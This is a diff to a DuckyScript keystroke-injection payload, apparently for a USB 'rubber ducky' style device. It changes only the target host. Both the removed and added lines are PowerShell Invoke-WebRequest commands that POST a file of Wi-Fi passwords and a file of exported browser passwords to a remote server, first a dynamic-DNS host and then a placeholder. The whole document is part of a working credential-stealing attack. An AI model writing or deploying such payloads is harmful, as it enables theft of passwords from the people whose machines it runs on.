@@ -21,7 +21,7 @@ ENTER
 DELAY 500
 
 REM Send Wi-Fi passwords to server
-STRING powershell Invoke-WebRequest -Uri http://xoot404.ddns.net:4443/data.php -Method POST -InFile Wi-Fi-PASS
+STRING powershell Invoke-WebRequest -Uri http://CHANGEtoYOURserver:4443/data.php -Method POST -InFile Wi-Fi-PASS
 ENTER
 DELAY 4000
 
@@ -67,7 +67,7 @@ STRING cd $env:USERPROFILE\Desktop
 DELAY 500
 ENTER
 REM Send the browser passwords to server
-STRING powershell Invoke-WebRequest -Uri http://xoot404.ddns.net:4443/data2.php -Method POST -InFile export.txt
+STRING powershell Invoke-WebRequest -Uri http://CHANGEtoYOURserver:4443/data2.php -Method POST -InFile export.txt
 ENTER
 DELAY 1200
 STRING clear
